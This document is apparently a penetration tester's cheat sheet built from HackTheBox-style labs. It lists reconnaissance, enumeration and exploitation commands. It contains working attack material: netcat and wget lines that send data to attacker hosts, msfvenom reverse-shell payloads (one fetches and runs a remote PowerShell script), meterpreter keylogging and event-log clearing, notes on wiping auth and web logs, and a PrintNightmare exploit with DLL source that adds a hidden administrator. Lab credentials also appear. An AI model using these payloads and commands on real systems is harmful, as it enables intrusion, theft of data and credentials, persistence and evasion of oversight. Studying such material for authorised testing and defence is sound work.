nmap -sn 10.60.92.78/24 -T5 | grep 'Nmap scan report for' | awk '{print $5}' > nmap_ping_sweep.out

Protocol ping:
nmap -PO -sO -vv -iL Private_IPs.txt -oN test_alive.out

ICMP:
nmap -iL Private_IPs.txt -PE -PP -PM -v -sn -n -oG - | grep Up | awk '{print $2}'

proxychains nmap -sT -n -Pn --disable-arp-ping -T5 --host-timeout 80m -vvv --open --top-ports=100 10.2.2.22 -oN top-100_10.2.2.22.out
proxychains nmap -sT -n -Pn --disable-arp-ping -T5 --host-timeout 200m -vvv --open -p1-10000 10.1.1.68 -oN first_10000_10.1.1.68.out
proxychains nmap -sT -n -Pn --disable-arp-ping -T5 --host-timeout 200m -vvv --open -p- 10.1.1.68 -oN all_10.1.1.68.out

proxychains nmap -sT -n -Pn --disable-arp-ping -T5 --host-timeout 80m -vvv --open -sV --version-intensity 9 -sC -p <open ports found> 10.2.2.31 -oN sV_10.2.2.31.out
proxychains nmap -sT -n -Pn --disable-arp-ping -T5 --host-timeout 80m -vvv --open -sV --version-intensity 9 -sC --script vuln -p <open ports found> 10.1.1.236 -oN vuln_10.1.1.236.out

hping3 --icmp-ts 192.168.1.1 -c 3 -V (ICMP time request)

hping3 -2 192.168.1.1 -c 3 -V  (Sends udp packet to port 0)


-----------------------------------------------------------DNS-Enumeration(+nocookie is only for windows dns servers)----------------------------------------
Finding dns servers:
nmap -iL live_hosts_port_scan -p U:53,T:53 -sU -sS --open
nmap -iL live_hosts_port_scan -p U:53,T:53 -sU -sS --open --source-port 53


Determine the Domain Name(Ptr records-Reverse Lookup):
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sL -v  --dns-servers 172.16.5.10
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sn -v  --dns-servers 172.16.5.10
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sn -R -v --dns-servers 172.16.5.10
nmap 172.16.5.1/24 -sL --dns-servers 172.16.5.10

dig @172.16.5.10 -x 172.16.5.10 +nocookie  (reverse lookup)

Specifically for windows machines:

nbtscan -r <range>
dig _gc. domain_name

#nslookup
> server 172.16.5.10
Default server: 172.16.5.10
Address: 172.16.5.10#53
> 172.16.5.10
10.5.16.172.in-addr.arpa        name = els-winser2003.sports.com.

Zone transfer:
dnsrecon -d zonetransfer.me -t axfr

dig @172.16.5.10 sportsfoo.com AXFR +nocookie +noall +answer +nocmd

nmap --script dns-zone-transfer.nse  --script-args dns-zone-transfer.server=172.16.5.10,dns-zone-transfer.domain=sportsfoo.com

host -t axfr sportsfoo.com 172.16.5.10

dig(+nocookie +noall +answer +nocmd)
dig @10.50.96.5 foocampus.com ANY +nocookie

dig @10.50.96.5 foocampus.com AXFR +nocookie  (zone transfer)

host -t axfr foocampus.com 10.50.96.5  (zone transfer)

nslookup -type=any zonetransfer.me    // gives all the dns records for host zonetransfer.me

host -t ns zonetransfer.me 			  // gives name server records for host zonetransfer.me
host -l zonetransfer.me nsztm2.digi.ninja  //lists all hosts in a domain, using AXFR

dig axfr zonetransfer.me @nsztm2.digi.ninja

via nslookup :
C:\Users\pswalia>nslookup
Default Server:  UnKnown
Address:  49.45.0.5

> server nsztm1.digi.ninja4
*** Can't find address for server nsztm1.digi.ninja4: Non-existent domain
> server nsztm1.digi.ninja
Default Server:  nsztm1.digi.ninja
Address:  81.4.108.41

> ls -d zonetransfer.me

Bruteforcing sub domains:
dnsrecon -t brt -d realcorp.htb -n 10.10.10.224 -D /root/Desktop/combined.txt -v --threads 10000

--------------------------------------------------Find dns server-----------------------
cat /etc/resolv.conf

-----------------------------------------------------Mail server DNS records----------------------------------
dig TXT microsoft.com

dig dkim._domainkey.twitter.com TXT

dig _dmarc.twitter.com TXT

-----------------------------------------------------snmp---------------------------------------------
Find community string:
nmap -iL livehosts_total -p U:161,162 -sU --open (Finding hosts with snmp service)
onesixtyone -c dict.txt 10.10.10.5

Enumeration:
snmpwalk -v 2c -c public 10.10.10.241 .iso (dumps everything)
snmpwalk -v 1 -c private 10.10.10.5
snmpwalk -v 2c -c public <ip>
snmpwalk -v2c -c public nsExtendObjects
nmap -p 161 -sU -sV --version-intensity 9 -sC --script=snmp-*.nse -n -Pn -v -oN nse_scripts_snmp 10.10.10.5

apt install snmp-mibs-downloader (to view snmwalk output)
/etc/snmp/snmp.conf(comment the line "mibs :" and then run snmpwalk)

dos2unix *.txt
./snmpenum.pl 10.10.10.5 private windows.txt > snmpenum.out

perl snmpenum.pl 10.10.10.241 public linux.txt



-----------------------------------------------------------arp-cache--------------------------------------
ip neighbour

------------------------------------------------------------groups----------------------------------------------
groups (to see current user's groups)

cat /etc/group
cut -d: -f1 /etc/group | sort

getent group

----------------------------------------------------------group users-------------------------------------------
getent group

------------------------------------------------------grep,awk text/string filtering-------------------------------
awk -F \[ '{print $2}' 

echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
hello friend

Change to lowercase:
cat names.txt| awk '{print $1"@bolt.htb"}' | awk '{ print tolower($0) }'

Filtering words >= 8 character in length:
awk 'length($1) >= 8 { print $1 }' cewl_wordlist.txt

Reading line by line from pipe words >=len 8 :
awk 'length($1) >= 8 { print $1 }' /usr/share/wordlists/rockyou.txt |  while read x ; do echo "hi:$x" ; done

cat file.txt | awk 'length($0) > 3' (filter lines greater then 3 characters)

grep -R text *   //find text in all files recursively
Searching Multiple strings:
grep -inR -E 'passw|token|key' META-INF/
grep -inR 'passw\|token\|key' META-INF/
find . -name META-INF -type d -exec sh -c "grep -inR -E 'passw|token|key' \"{}\"" \; # findig META-INF folders and looking for specific keywords in files

grep -iRl "Password" //find files whih contain string pPassword in them
grep -i -e 'password' -e 'pwd' -e 'passwd' (multiple strings)
grep -v 'password' (invert match)
xargs (Converts multiline output to space seperated)
tr(text replace)

tr '\n' ',' < input.txt > output.txt (replacing \n with ,)

sort --unique
cat all_open_ports.txt | sort --unique | wc -l

cat top-100_10.2.2.23.out | grep open |sed -n '1!p'| awk -F '/' '{print $1}' | sed --expression=':a;N;$!ba;s/\n/,/g' (open ports from nmap output)

-----------------------------------------------list files with absolute path----------------------------------
ls -dl $PWD/*

----------------------------------------------finger service enumeration--------------------------
nmap --script finger 192.168.13.72 -p79
finger root@192.168.13.72
for name in $(cat /usr/share/wordlists/metasploit/unix_users.txt); do finger $name@192.168.13.71; done > valid_users.txt

-------------------------------------wireshark-filters------------------------------------
tcp contains "elsfoo"


-----------------------------------------------Exfiltatration/Exfiltrate files using netcat------------------------------
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker_IP>/80   (compromised system)

nc -lrvp 80 > datafolder.tmp  (attacker box)

dd conv=ascii if=datafolder.tmp | base64 -d datafolder.tar

tar xf datafolder.tar


Bind connection:
nc -l -p 3306 < /srv/hello.txt

nc <IP> 3306


Recieving file via nc:
nc -lvp 9001 > file #Reciever side
cat /usr/local/bin/csvupdate > /dev/tcp/10.10.14.35/9001  # Sender side


---------------------------------------recursive netcat-------------------------------------------------
while true; do nc -lrvp 88 ; done

----------------------------------------------netcat rlwrap(windows)-------------------------------------------------
rlwrap nc -lrvp 53





-----------------------------------------------------------copy piping something to clipboard-----------------------------------------
| xclip -sel clipboard


----------------------------------------------------------bash tricks-----------------------------------------

running commands from history:
history

!2 (runs second command in history output) 

!<line number>


Running previous commands:
!!

Exfiltrate command output:
var=$(id);wget http://192.168.119.156:443/$var 

----------------------------------------------------word count(wc)------------------------------------
wc -m < test.txt (counts characters in test.txt)

------------------------------------------------------------tmux---------------------------------------------
ctrl+b % (vertical pane)
ctrl+b " (horizontal pane)
ctrl+b c (new window)
ctrl+b , (rename window)
ctrl+b $ (rename session)
ctrl+b [ (scroll)
ctrl+b [ crtl+s (search in output buffer)
ctrl+b : clear-history
ctrl+b+shift+p (logging current session)
tmux ls (sessions)
ctrl+b d (detach session)
tmux new -s <session_name>
tmux rename-session -t 0 <name> (rename session)
tmux kill-session -t 0
tmux attach-session -t 1
tmux kill-window -t 2
tmux show -g (current config)
SPACE (Start copying) CTRL + b, ] to paste in a possibly different Tmux pane/window

----------------------------------------------------------unzip----------------------------------------
find . -name '*.jar' -exec sh -c 'unzip -d "${1%.*}" "$1"' _ {} \; #extracting multiple .jar files in seperate folders


---------------------------------------------------------Secrets in jar---------------------------------------
#Find java process id and then check for cmline arguments
cat /proc/<java_pid>/cmdline

------------------------------------------------------------git---------------------------------
git pull origin master (update local  git repo with github)

git log (checking previous commits)

git diff <commit_id> (seeing changes)

git clone https://github.com/0ang3el/aem-hacker.git -c http.sslVerify=false

git -c http.sslVerify=false pull

-------------------------------------------------ping ttl os detection--------------------------------

ttl<=64 Linux
ttl<=128 Windows
ttl>128 network devices

---------------------------------------------------ldap------------------------------------------
ldapsearch:
ldapsearch -x -b "DC=htb,DC=local" -h 10.10.10.161
ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -s base namingcontexts
ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -b "DC=HTB"

ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'

AddNewDNSrecord remotely:
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webps.intelligence.htb --data 10.10.14.2 10.10.10.24

GUI Tool:
Apache Directory Studio

------------------------------------------------resetting neo4j password:ruby-benny-mixer-change-consul-1148------------------------------

locate neo4j | grep auth

------------------------------------------------------evil-winrm(5985)---------------------------------------

evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972

evil-winrm -S -c key.cert -k key.pem -i 10.10.11.152

------------------------------------------------------open .db sqlite3 files-------------------------
sqlite3 Audit.db .dump

-------------------------------------------------------------------db client------------------------------------------------
dbeaver-ce

-------------------------------------------------stuck ssh  escape sequence--------------------------------------
press Enter then ~  then .

-------------------------------------------------------network-manager----------------------------

 dhclient eth0

---------------------------------------------------------------clearing tracks---------------------------------

"/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
"/var/log/syslog" (System events such as firewall alerts:)
"/var/log/apache2/access.log"

-------------------------------------------------------disks--------------------------------------------------
ls -al /dev/sd* (find all block devices)

findmnt (find currently mounted devices)
mount (find currently mounted devices)
cat /etc/mtab

Unmount shares:
umount -f -l <local_mount_path>
umount -a -t cifs -l

ls -lR / 2>/dev/null | grep ^b (finding all the block devices)

Transfering disk images/block devices(Kotarak htb):
dd if=./dm-0 | gzip -9 | nc 10.10.14.2 8002

nc -lrvp 8002 > compressed_file


Recovering deleted files ext4(recovered files will be stared in RECOVERED_FILES directory):
extundelete <path to block device> --restore-all  

---------------------------------------------------------------------------mount-shared-folders--------------------------------------------
add
vmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0

to /etc/fstab
#//192.168.8.1/Ethical_Hacking /mnt/Ethical_Hacking cifs username=<username>,password=<password> 0 0


Then reboot, or  mount -a

---------------------------------------------------------------Find swap partition/files------------------------------------------
swapon -s

cat /proc/swaps 

-------------------------------------------------------watch----------------------------------
watch -n 1 'ls -la'

---------------------------------------------------smtp----------------------------------------------

telnet 10.10.10.77 25

EHLO 10.10.10.77

Mail from: test@megabank.com
250 OK
RCPT To: nico@megabank.com
250 OK(shows email exists)

Mail from: test@megabank.com
250 OK
RCPT To: random@megabank.com  
550 Unknown user  (shows email does  not exist)

mail from:
rcpt to:
DATA
Subject: <sub>
<data>
.

emailclient: thunderbird

------------------------------------------Enumerate smtp verbs/options---------------------------
nmap --script smtp-commands <IP> -p 25

---------------------------------------------------Enumerate smtp users---------------------------------


----------------------------------------------vnc-------------------------------------------
vncviewer -passwd secret 127.0.0.1:5901 (passing password from file)

-------------------------------------------------vnc-gui---------------------------------
xhost +

--------------------------------------------------Allowing root user to run gui apps in non root user gui session--------------------------------------
xhost +SI:localuser:root

------------------------------------------------routing table----------------------------------
ip route

----------------------------------------------run_binary_in_background-------------------------------
./<name_of_binary>&


--------------------------------------------------Fuzzing------------------------------------------
for i in `find out/crashes/ -type f`; do cat $i | ./duk; done


-------------------------------------------------Exploit suggeter-----------------------------
./windows-exploit-suggester.py -i /mnt/Ethical_Hacking/Practice_LABS/hackthebox/Machines/Optimum/shared/systeminfo.out -d 2021-07-16-mssb.xls -l

--------------------------------------------------------Ofset for buffer overflow-------------------------------
/usr/bin/msf-pattern_create -l 200

/usr/bin/msf-pattern_offset -q 0Ab1 -l 200

-----------------------------------------------msfvenom--------------------------------------
msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=192.168.2.1 -f psh-reflection > payload.ps1

msfvenom --list payloads --platform windows -a x64

msfvenom  --list formats

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=53 -f aspx

msfvenom -p java/shell_reverse_tcp lhost=10.10.14.23 lport=53 -f war -o pwn.war

Buffer Overflow:
msfvenom -a x86 -p windows/shell_bind_tcp RPORT=12345 --smallest -b "\x00\x0a\x0d" -f python 

msfvenom -a x86 -p windows/shell_reverse_tcp LPORT=12345 LHOST=10.10.14.8 --smallest -b '\x00\x0a\x0d' -f python 

Size restrictions:
msfvenom -p windows/exec CMD="powershell \"iex(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp2.ps1')\"" --smallest -b "\x00\x0a\x0d" -f python 

Stageless:
linux/x86/shell_reverse_tcp

Staged:
linux/x86/shell/reverse_tcp

--------------------------------------------------msfconsole------------------------------
msf6 > search type:exploit platform:windows

msfconsole -q -x "use exploit/multi/handler;\
 set PAYLOAD windows/meterpreter/reverse_tcp;\
set AutoRunScript post/windows/manage/migrate;\ 
 set LHOST 192.168.119.156;\
 set LPORT 3389;\
 run" 

--------------------------------------------------meterpreter--------------------------
meterpreter > edit file.txt
meterpreter > execute -f cmd.exe -i H
meterpreter > search -f secret.*
meterpreter > ps
meterpreter > getpid

meterpreter > migrate <pid>
meterpreter > run post/windows/manage/migrate

meterpreter > keyscan_start
meterpreter > keyscan_dump

meterpreter > clearev

meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1

run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true

msf6 > load nessus
msf6 > nessus_connect Nessus:Nessus@127.0.0.1:8834 ssl_verify
msf6 > nessus_help
msf6 > nessus_scan_list
msf6 > nessus_db_import <scan id>
msf6 > nessus_report_hosts <scan_id>
msf6 > nessus_report_vulns <scan_id>
msf6 > nessus_db_import <scan_id>
msf6 > services

copy plugin to /root/.msf4/plugins (add <plugin>.rb here)
msf6 > load plugin
msf6 > vuln_exploit

msf6 > set rhosts file:///mnt/Shared/Assignments/Maximo_Application_Suite-MS_Core-Q4_2021/Private_IPs/targets.txt

set AutoRunScript migrate -n svchost.exe # to automatically migrate while we get meterpreter session

multi/manage/shell_to_meterpreter
-----------------------------------metasploit-------------------------------
ctrl+z --> to run session in background
sessions -l --> to list all the active sessions
----------------------------------metasploit .rc scripts---------------------------
msfconsole -r /var/lib/veil/output/handlers/payload1.rc


-----------------------------------------------------printnightmare------------------------------
For those who are struggling with printnightmare:

1. Create a dll with following source code-

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c net user golu Golu@1234 /add");
        system("cmd.exe /c net localgroup administrators golu /add");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

2. Transfer dll to the driver machine.
3. Setting environment and downloading exploit-
python3 -m venv venv

source venv/bin/activate

git clone https://github.com/cube0x0/impacket

git clone https://github.com/cube0x0/CVE-2021-1675

4. python3 CVE-2021-1675/CVE-2021-1675.py 'DRIVER/tony:liltony@10.10.11.106' 'C:\Users\tony\Documents\Dll1.dll'

5. evil-winrm -u 'golu' -p 'Golu@1234'  -i 10.10.11.106